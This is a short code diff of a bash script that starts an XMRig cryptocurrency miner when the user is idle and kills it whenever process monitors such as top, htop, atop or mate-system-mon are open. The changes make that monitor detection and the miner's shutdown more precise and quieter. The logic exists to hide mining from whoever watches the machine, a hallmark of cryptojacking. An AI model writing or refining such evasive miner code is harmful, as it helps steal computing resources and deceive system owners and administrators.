@@ -35,8 +35,8 @@ main() {
 
 	while true; do 
 		sleep 1
-		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
-			pkill $XMRIGNAME
+		if pgrep -x "top" || pgrep -x "htop" || pgrep -x "atop" || pgrep -x "mate-system-mon"; then
+			killall -q $XMRIGNAME
 			continue
 		fi
 
@@ -46,7 +46,7 @@ main() {
 			if [[ idle -gt $INACTIVITY_IN_MSEC ]]; then
 				run_xmr
 			else 
-				pkill $XMRIGNAME 
+				killall -q $XMRIGNAME 
 			fi
 		else
 			idle=$(who -u | awk '{print $5}')
@@ -59,10 +59,10 @@ main() {
 				if [[ $idleH -gt 0 || $idleM -gt $INACTIVITY_IN_MINS ]]; then
 					run_xmr
 				else
-					pkill $XMRIGNAME
+					killall -q $XMRIGNAME
 				fi
 			else 
-				pkill $XMRIGNAME
+				killall -q $XMRIGNAME
 			fi
 		fi
 	done
